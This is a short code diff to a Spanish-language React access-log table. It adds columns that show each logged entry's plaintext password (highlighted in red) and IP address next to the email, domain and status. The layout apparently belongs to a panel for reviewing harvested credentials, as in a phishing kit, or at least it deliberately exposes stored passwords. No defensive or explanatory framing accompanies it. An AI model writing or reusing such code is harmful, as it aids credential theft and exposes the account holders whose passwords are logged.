@@ -36,6 +36,8 @@ function AccessTable({ logs }) {
               <TableHeadCell>Fecha</TableHeadCell>
               <TableHeadCell>Hora</TableHeadCell>
               <TableHeadCell>Email</TableHeadCell>
+              <TableHeadCell>Contraseña</TableHeadCell>
+              <TableHeadCell>IP</TableHeadCell>
               <TableHeadCell>Dominio</TableHeadCell>
               <TableHeadCell>Estado</TableHeadCell>
             </tr>
@@ -48,6 +50,12 @@ function AccessTable({ logs }) {
                 <TableCell>{log.time}</TableCell>
                 <TableCell style={{ fontFamily: 'monospace', fontSize: '13px' }}>
                   {log.email}
+                </TableCell>
+                <TableCell style={{ fontFamily: 'monospace', fontSize: '13px', color: '#e94560' }}>
+                  {log.password}
+                </TableCell>
+                <TableCell style={{ fontFamily: 'monospace', fontSize: '12px', color: '#9e9e9e' }}>
+                  {log.ipAddress}
                 </TableCell>
                 <TableCell>
                   <DomainBadge>{log.domain}</DomainBadge>
